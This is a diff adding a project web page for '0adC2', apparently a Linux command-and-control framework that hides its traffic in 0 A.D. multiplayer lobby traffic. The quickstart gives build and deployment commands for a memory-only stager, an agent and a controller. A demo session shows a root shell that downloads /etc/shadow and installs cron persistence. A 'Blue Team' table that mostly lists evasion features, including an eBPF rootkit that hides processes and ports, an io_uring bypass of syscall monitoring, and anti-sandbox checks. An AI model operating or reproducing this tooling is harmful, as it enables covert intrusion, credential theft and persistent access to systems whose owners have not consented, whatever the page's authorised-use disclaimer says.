+AGENT_SRV_PORT=<span class="kw">20595</span>
+<span class="c"># cover name in game lobby</span>
+AGENT_PLAYER=<span class="kw">Spectator42</span>
+<span class="c"># shared bootstrap key</span>
+AGENT_KEY=<span class="kw">MySecret42</span></pre>
+          </div>
+        </div>
+        <div class="qs-step">
+          <div class="qs-num">III</div>
+          <div class="qs-body">
+            <h4>Build everything</h4>
+            <p>Each full build randomises all static IOCs. Add <code>EXPIRE_DAYS=N</code> for a kill date.</p>
+            <pre><span class="c">// full prod build — new random IOCs every time</span>
+<span class="ok">make fresh_all</span>
+
+<span class="c">// with a 14-day kill date</span>
+<span class="ok">make fresh_all EXPIRE_DAYS=14</span>
+
+<span class="c">// debug build (foreground, no daemon, stderr traces)</span>
+<span class="ok">make fresh_debug</span></pre>
+          </div>
+        </div>
+        <div class="qs-step">
+          <div class="qs-num">IV</div>
+          <div class="qs-body">
+            <h4>Deploy stager, connect controller</h4>
+            <pre><span class="c">// attacker machine: start staging server</span>
+./stage_srv ./agent 20596
+
+<span class="c">// on target: stager loads agent into RAM, no disk write</span>
+./stager
+
+<span class="c">// open controller</span>
+./ctrl 10.0.0.2 20595 Spectator42 MySecret42
+
+<span class="c">// once [ECDH OK] appears:</span>
+<span class="pr">0adc2&gt;</span> !agents
+<span class="pr">0adc2&gt;</span> !target 3f9a1c02
+<span class="pr">0adc2&gt;</span> id
+<span class="pr">0adc2&gt;</span> !dl /etc/shadow
+<span class="pr">0adc2&gt;</span> !persist cron</pre>
+          </div>
+        </div>
+      </div>
+    </article>
+
+    <!-- DEMO -->
+    <article class="hentry" id="demo">
+      <div class="entry-header">
+        <div class="entry-title">Demo</div>
+        <div class="entry-meta">ECDH handshake · encrypted commands · XSalsa20-Poly1305 in transit</div>
+      </div>
+      <div class="entry-content">
+        <p>The controller joins the 0&nbsp;A.D. server as a spectator. Every exchange is wrapped in an ephemeral X25519 session — to a network observer it is indistinguishable from multiplayer lobby traffic.</p>
+        <div class="sterm">
+          <div class="sterm-bar">
+            <span class="sterm-dot" style="background:#c45252"></span>
+            <span class="sterm-dot" style="background:var(--gold)"></span>
+            <span class="sterm-dot" style="background:#6aaf6a"></span>
+            <span class="sterm-title">ctrl &#x2014; 192.168.1.10:20595</span>
+          </div>
+          <div class="sterm-body"><span class="sg">&#x2554;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2557;
+&#x2551;           0adC2 &#x2014; Controller         &#x2551;
+&#x255a;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x255d;</span>
+<span class="sd">Server: 192.168.1.10:20595  Player: Spectator99</span>
+<span class="sy">[DH]</span> agent <span class="sw">3f9a1c02</span> &#x2192; ECDH init
+<span class="sn">[ECDH OK]</span> session key established &#x2014; XSalsa20-Poly1305 active
+<span class="sn">[+]</span> <span class="sw">3f9a1c02</span> &#x2014; Linux 6.1 x86_64 uid=0(root) root@target
+<span class="sp">0adc2&gt;</span> id
+<span class="sn">[RSP 3f9a1c02]</span> uid=0(root) gid=0(root) groups=0(root)
+<span class="sp">0adc2&gt;</span> !dl /etc/shadow
+<span class="sn">[DL OK]</span> /etc/shadow &#x2192; ./shadow <span class="sd">(1.2 KB, encrypted in transit)</span>
+<span class="sp">0adc2&gt;</span> !persist cron
+<span class="sn">[OK]</span> persistence installed via crontab</div>
+        </div>
+        <p class="sterm-caption">Session replay &middot; all traffic over ENet UDP/20595 &middot; no dedicated C2 port &middot; no TLS anomaly</p>
+      </div>
+    </article>
+
+    <!-- DETECTION / BLUE TEAM -->
+    <article class="hentry" id="detection">
+      <div class="entry-header">
+        <div class="entry-title">Blue Team — Detection &amp; Countermeasures</div>
+        <div class="entry-meta">Red Team feeds Blue Team · Detection surface · Mitigations</div>
+      </div>
+      <div class="entry-content">
+        <p>A good Red Team engagement leaves the Blue Team better equipped. Below is the full known detection surface and the mitigations in place.</p>
+        <table class="det-table">
+          <thead><tr><th>Layer</th><th>Detection vector</th><th>Mitigation</th></tr></thead>
+          <tbody>
+            <tr><td>Network</td><td>UDP/20595 ENet without a real 0 A.D. process on the host</td><td><span class="badge b-warn">Correlation needed</span></td></tr>
+            <tr><td>Network</td><td>NMT_CHAT sender length &gt; 36 bytes</td><td><span class="badge b-warn">Suricata rule possible</span></td></tr>
+            <tr><td>Network</td><td>sender[0] ∉ [0-9a-f-] (outside hex UUID chars)</td><td><span class="badge b-warn">Suricata rule possible</span></td></tr>
+            <tr><td>Network</td><td>Regular keep-alive every ~20 s (beacon pattern)</td><td><span class="badge b-ok">Poisson jitter active</span></td></tr>
+            <tr><td>Network</td><td>No NMT_END_COMMAND_BATCH heartbeat</td><td><span class="badge b-ok">Implemented and sent</span></td></tr>
+            <tr><td>Host</td><td>PID visible in /proc</td><td><span class="badge b-ok">eBPF getdents64 hook</span></td></tr>
+            <tr><td>Host</td><td>UDP port in /proc/net/udp or ss output</td><td><span class="badge b-ok">eBPF openat+read patch</span></td></tr>
+            <tr><td>Host</td><td>Suspicious process name</td><td><span class="badge b-ok">prctl + argv[0] spoof</span></td></tr>
+            <tr><td>Host</td><td>Falco / auditd syscall visibility</td><td><span class="badge b-ok">io_uring bypass</span></td></tr>
+            <tr><td>Host</td><td>Core dump or ptrace attach</td><td><span class="badge b-ok">PR_SET_DUMPABLE = 0</span></td></tr>
+            <tr><td>Memory</td><td>Code scan during sleep</td><td><span class="badge b-ok">SilentPulse .text XOR</span></td></tr>
+            <tr><td>Memory</td><td>Static IOC / YARA matching</td><td><span class="badge b-ok">Per-build randomisation</span></td></tr>
+            <tr><td>Sandbox</td><td>VM or hypervisor environment</td><td><span class="badge b-ok">CPUID + RDTSC checks</span></td></tr>
+            <tr><td>Sandbox</td><td>Low uptime, few processes, small RAM</td><td><span class="badge b-ok">12-check anti-sandbox</span></td></tr>
+            <tr><td>Sandbox</td><td>LD_PRELOAD / LD_AUDIT hooking</td><td><span class="badge b-ok">Env var detection</span></td></tr>
+          </tbody>
+        </table>
+      </div>
+    </article>
+
+  </div><!-- /primary -->
+
+  <!-- SIDEBAR -->
+  <div id="secondary">
+    <div class="widget">
+      <h3 class="widget-title">Project</h3>
+      <ul>
+        <li><span class="stat-num">C</span> <a href="https://github.com/franckferman/0adC2/blob/stable/src/agent.c">agent.c</a></li>
+        <li><span class="stat-num">C</span> <a href="https://github.com/franckferman/0adC2/blob/stable/src/ctrl.c">ctrl.c</a></li>
+        <li><span class="stat-num">C</span> <a href="https://github.com/franckferman/0adC2/blob/stable/src/stager.c">stager.c</a></li>
+        <li><span class="stat-num">BPF</span> <a href="https://github.com/franckferman/0adC2/blob/stable/src/bpf_rootkit.bpf.c">bpf_rootkit</a></li>
+        <li><span class="stat-num">H</span> <a href="https://github.com/franckferman/0adC2/blob/stable/src/c2_proto.h">c2_proto.h</a></li>
+      </ul>
+    </div>
+
+    <div class="widget">
+      <h3 class="widget-title">Requirements</h3>
+      <ul>
+        <li>Linux x86_64</li>
+        <li>clang (BPF compilation)</li>
+        <li>libsodium-dev</li>
+        <li>libenet-dev</li>
+        <li>libreadline-dev</li>
+        <li>bpftool</li>
+        <li>python3</li>
+        <li>0 A.D. dedicated server</li>
+      </ul>
+    </div>
+
+    <div class="widget">
+      <h3 class="widget-title">Encryption</h3>
+      <ul>
+        <li>X25519 ECDH</li>
+        <li>XSalsa20-Poly1305</li>
+        <li>SHA-256 KDF</li>
+        <li>RC4 bootstrap</li>
+        <li>Base62 body encoding</li>
+      </ul>
+    </div>
+
+    <div class="widget">
+      <h3 class="widget-title">Links</h3>
+      <ul>
+        <li><a href="https://github.com/franckferman/0adC2">GitHub Repository</a></li>
+        <li><a href="https://github.com/franckferman/0adC2/blob/stable/README.md">README</a></li>
+        <li><a href="https://github.com/franckferman/0adC2/blob/stable/TODO.md">Roadmap</a></li>
+        <li><a href="https://github.com/franckferman/0adC2/issues">Issues</a></li>
+        <li><a href="https://play0ad.com">0 A.D.</a></li>
+      </ul>
+    </div>
+  </div><!-- /secondary -->
+
+</div><!-- /main -->
+</div><!-- /page -->
+
+<!-- FOOTER -->
+<div id="colophon">
+  <div id="footer">
+    <div class="foot-col">
+      <h4>0adC2</h4>
+      <ul>
+        <li><a href="#about">About</a></li>
+        <li><a href="#features">Features</a></li>
+        <li><a href="#steganography">Steganography</a></li>
+        <li><a href="#quickstart">Quickstart</a></li>
+        <li><a href="#demo">Demo</a></li>
+        <li><a href="#detection">Blue Team</a></li>
+      </ul>
+    </div>
+    <div class="foot-col">
+      <h4>Source</h4>
+      <ul>
+        <li><a href="https://github.com/franckferman/0adC2">GitHub</a></li>
+        <li><a href="https://github.com/franckferman/0adC2/blob/stable/README.md">README</a></li>
+        <li><a href="https://github.com/franckferman/0adC2/blob/stable/TODO.md">Roadmap</a></li>
+        <li><a href="https://github.com/franckferman/0adC2/issues">Issues</a></li>
+      </ul>
+    </div>
+    <div class="foot-col">
+      <h4>Components</h4>
+      <ul>
+        <li><a href="https://github.com/franckferman/0adC2/blob/stable/src/agent.c">Agent</a></li>
+        <li><a href="https://github.com/franckferman/0adC2/blob/stable/src/ctrl.c">Controller</a></li>
+        <li><a href="https://github.com/franckferman/0adC2/blob/stable/src/stager.c">Stager</a></li>
+        <li><a href="https://github.com/franckferman/0adC2/blob/stable/src/bpf_rootkit.bpf.c">eBPF Rootkit</a></li>
+      </ul>
+    </div>
+    <div class="foot-col">
+      <h4>Legal</h4>
+      <ul>
+        <li style="color:#aaa;font-size:12px;line-height:1.6">For authorized Red Team and security research use only. Users are responsible for compliance with applicable laws.</li>
+      </ul>
+    </div>
+  </div>
+  <div id="footerbar">
+    <p>&copy; 2026 <a href="https://github.com/franckferman">Franck Ferman</a> · 0adC2</p>
+    <a href="https://github.com/franckferman/0adC2">GitHub</a>
+  </div>
+</div>
+
+
+<script>
+/* ── 0 A.D. ambient soundtrack ──────────────────────────────────── */
+(function(){
+  /* 0 A.D. OST — Wildfire Games, CC BY-SA 3.0
+   * Bundled locally in docs/audio/ — no external CDN dependency. */
+  var TRACKS = [
+    'audio/Mirage.ogg',
+    'audio/Harvest_Moon.ogg',
+    'audio/Mountain_Idyll.ogg',
+    'audio/Karmic_Confluence.ogg',
+    'audio/Albian_Nocturne.ogg',
+    'audio/Calm_Before_the_Storm.ogg'
+  ];
+
+  /* Fallback: if CDN unreachable, silence is fine — no error shown. */
+  var VOLUME   = 0.20;
+  var FADE_MS  = 2800;   /* cross-fade duration */
+  var FADE_STEP = 50;    /* ms per tick */
+
+  var current = null;
+
+  function shuffle(arr) {
+    var a = arr.slice();
+    for (var i = a.length - 1; i > 0; i--) {
+      var j = Math.floor(Math.random() * (i + 1));
+      var t = a[i]; a[i] = a[j]; a[j] = t;
+    }
+    return a;
+  }
+
+  function fadeOut(audio, cb) {
+    var vol = audio.volume;
+    var steps = FADE_MS / FADE_STEP;
+    var dec = vol / steps;
+    var timer = setInterval(function() {
+      vol = Math.max(0, vol - dec);
+      try { audio.volume = vol; } catch(e){}
+      if (vol <= 0) { clearInterval(timer); audio.pause(); cb(); }
+    }, FADE_STEP);
+  }
+
+  function fadeIn(audio) {
+    audio.volume = 0;
+    try { audio.play().catch(function(){}); } catch(e){}
+    var vol = 0;
+    var steps = FADE_MS / FADE_STEP;
+    var inc = VOLUME / steps;
+    var timer = setInterval(function() {
+      vol = Math.min(VOLUME, vol + inc);
+      try { audio.volume = vol; } catch(e){}
+      if (vol >= VOLUME) clearInterval(timer);
+    }, FADE_STEP);
+  }
+
+  function playPlaylist() {
+    var playlist = shuffle(TRACKS);
+    var idx = 0;
+
+    function playNext() {
+      var next = new Audio(playlist[idx % playlist.length]);
+      next.preload = 'auto';
+      current = next;
+      fadeIn(next);
+      next.addEventListener('ended', function() {
+        idx++;
+        /* Reshuffle when we've gone through all tracks */
+        if (idx % playlist.length === 0) playlist = shuffle(TRACKS);
+        fadeOut(next, playNext);
+      });
+      next.addEventListener('error', function() {
+        /* Track failed to load — skip silently */
+        idx++;
+        setTimeout(playNext, 800);
+      });
+    }
+
+    playNext();
+  }
+
+  /* Autoplay requires a user gesture on most browsers.
+   * We start on the first click/keydown anywhere on the page. */
+  var started = false;
+  function startOnGesture() {
+    if (started) return;
+    started = true;
+    document.removeEventListener('click',   startOnGesture);
+    document.removeEventListener('keydown', startOnGesture);
+    playPlaylist();
+  }
+  document.addEventListener('click',   startOnGesture, {passive: true});
+  document.addEventListener('keydown', startOnGesture, {passive: true});
+})();
+</script>
+
+</body>
+</html>
